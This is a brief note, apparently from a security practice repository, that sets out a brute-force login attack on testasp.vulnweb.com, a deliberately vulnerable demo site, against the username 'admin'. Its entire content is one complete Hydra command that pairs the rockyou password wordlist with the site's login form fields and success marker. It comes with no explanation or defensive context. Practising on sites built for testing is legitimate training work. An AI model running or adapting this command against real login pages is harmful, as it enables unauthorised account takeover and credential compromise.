# BruteForce_Hydra

Target: http://testasp.vulnweb.com/Login.asp?RetURL=%2FDefault%2Easp%3F
Login name: admin

Command: 
## hydra -l admin -P /usr/share/wordlists/rockyou.txt http://testasp.vulnweb.com/ http-post-form "/Login.asp?RetURL=%2FDefault%2Easp%3F:tfUName=^User^&tfUPass=^PASS^:S=logout" -vV -f
